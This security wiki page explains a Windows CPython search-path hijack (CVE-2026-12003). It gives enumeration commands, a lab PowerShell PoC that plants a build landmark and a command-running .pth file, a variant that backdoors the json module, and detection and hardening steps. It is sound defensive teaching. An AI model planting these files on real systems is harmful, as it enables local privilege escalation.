# Windows CPython Build-Landmark and `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

A runtime may retain relative paths that were intended only for its build tree. If an installed privileged runtime resolves one of those paths into a low-privilege-writable directory, an attacker can plant the expected **build landmark** and make the runtime trust an alternative library prefix. CVE-2026-12003 is a Windows CPython example: a planted `Modules\Setup.local` can redirect the standard-library entry in `sys.path` without modifying the protected Python installation.<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

Affected Windows builds compiled `VPATH=..\..` and exposed it as `sys._vpath`. The vulnerable fallback in `Modules/getpath.py` treated `VPATH\Modules\Setup.local` as evidence that the interpreter was running from a source tree; the following data flow turns that build-time value into a runtime search-path primitive.<sup>[[1]](#references)[[2]](#references)</sup>

| Stage | Derived value for `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | Attacker-controlled `C:\Lib` is appended to `sys.path` |

The check is a fallback used when the more specific `pybuilddir.txt` beside the executable is absent or unreadable. This matters because a low-privilege user may be unable to change `C:\Program Files\Python314`, yet still be able to create new directories at `C:\`. The later privileged `python.exe` process loads Python code using its own access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

Treat this as a privilege boundary only when all of these conditions hold:<sup>[[1]](#references)[[2]](#references)</sup>

- The target is an affected **Windows CPython** build; the vulnerable path logic is not a Python-language property.
- The directory obtained by resolving `..\..` from the directory containing `python.exe` permits a less-privileged user to create the landmark and `Lib` tree.
- A higher-privileged user, service, installer, or software-deployment account later starts that interpreter.
- No path-isolation configuration overrides the vulnerable discovery path.

## Enumeration

Inspect both the compiled value and the effective search path. An exposed `..\..` value is a useful lead, but it is not proof of exploitability: also resolve the path, test ACLs, and confirm that a planted landmark would be outside the protected installation.<sup>[[1]](#references)[[2]](#references)</sup>

```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```

Do not restrict the assessment to official installers. For every product that bundles `python.exe`, resolve its `sys._vpath` relative to the actual executable directory and review the ACLs on the resulting `Modules` and `Lib` locations. A deeper installation path may resolve to a different writable application or vendor directory instead of `C:\`.<sup>[[1]](#references)</sup>

## Lab exploitation workflow

The following lab PoC mirrors enough of the legitimate runtime below the selected prefix for Python to initialize, adds an executable `.pth` line, and finally creates the landmark. Create the payload before the landmark to avoid leaving the interpreter temporarily pointed at an incomplete library tree.<sup>[[1]](#references)</sup>

```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
  Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```

During normal site initialization, Python processes `.pth` files in recognized site-packages directories. Only lines beginning with `import` followed by whitespace are executed, and the executable statement must stay on one physical line; `python -S` suppresses the automatic `site` import and therefore this trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Import-triggered alternative

Startup execution is not required. After reproducing the legitimate library tree, backdoor a module that a privileged script predictably imports. For example, adding code to the planted `Lib\json\__init__.py` executes when the victim imports `json`; choosing a reliable but not universally imported module can make the trigger less noisy.<sup>[[1]](#references)</sup>

```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
  Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```

This variant still inherits the importing process token, but it depends on the target application importing the modified module. Preserve the original module behavior when testing real software or the import may fail before the intended privileged workflow completes.<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path planting can precede installation. A low-privilege user can prepare the future `Lib` tree and `Modules\Setup.local`, then wait for a privileged software portal, help-desk workflow, or deployment system to perform an all-users installation. Installers that launch the new interpreter to install packages or precompile the standard library can trigger the payload under the deployment account without an administrator manually opening Python.<sup>[[1]](#references)</sup>

This also changes deployment review: inspect writable ancestors and pre-existing landmark/library directories **before** installing or upgrading a bundled runtime, rather than checking only the final installation directory after deployment.<sup>[[1]](#references)</sup>

## Detection and hardening

Useful host pivots are the unexpected landmark and library tree, followed by a privileged Python launch. Hunt for `Modules\Setup.local`, root-level or otherwise out-of-place `Lib\site-packages\*.pth`, copied standard-library packages, and module files whose owner or creation time differs from the protected installation. Correlate their creation by a standard user with elevated `python.exe` spawning `cmd.exe`, `powershell.exe`, account-management tools, or other unusual children.<sup>[[1]](#references)</sup>

```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
  Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
  Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```

The upstream fix removes the `VPATH\Modules\Setup.local` fallback and makes `pybuilddir.txt` the sole build-tree indicator. Prefer a fixed build or a per-user installation managed with the current Python install manager. Where upgrading is temporarily impossible, protect the resolved ancestor and pre-create `Modules` with restrictive ACLs; controlled `._pth` files or `PYTHONHOME` can also alter discovery, but require application compatibility testing.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking and Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - In-tree search paths can be enabled without modifying install directory](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Remove the `VPATH/Modules/Setup.local` fallback](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)

{{#include ../../../banners/hacktricks-training.md}}
